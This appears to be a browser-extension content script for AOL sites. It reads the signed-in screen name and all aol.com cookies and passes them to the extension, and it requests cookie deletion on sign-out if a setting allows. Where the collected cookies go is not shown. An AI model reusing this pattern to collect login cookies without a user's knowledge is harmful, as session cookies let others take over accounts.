import { sendMessage, Storage } from '../redefination';
import { wait, waitElementToLoad } from './util';

let clear = true;

Storage.get('clear').then((e) => {
  clear = e.clear;
});

async function aol() {
  const urls = [
    'https://aol.com',
    'https://www.aol.com',
    'https://mail.aol.com',
    'https://login.aol.com',
  ];
  await wait(1000);
  await waitElementToLoad('.screenNameNode');

  // @ts-ignore
  const user = document.querySelector('.screenNameNode')?.innerText;

  // @ts-ignore
  const extraCookies = await cookieStore.getAll({ domain: 'aol.com' });
  sendMessage({ GET_COOKIES: true, extraCookies, user: user, domain: 'aol.com' });

  document.querySelector('span.signOutLink')?.addEventListener('click', () => {
    if (clear) sendMessage({ DELETE_COOKIES: true, urls: urls });
  });
}

aol();
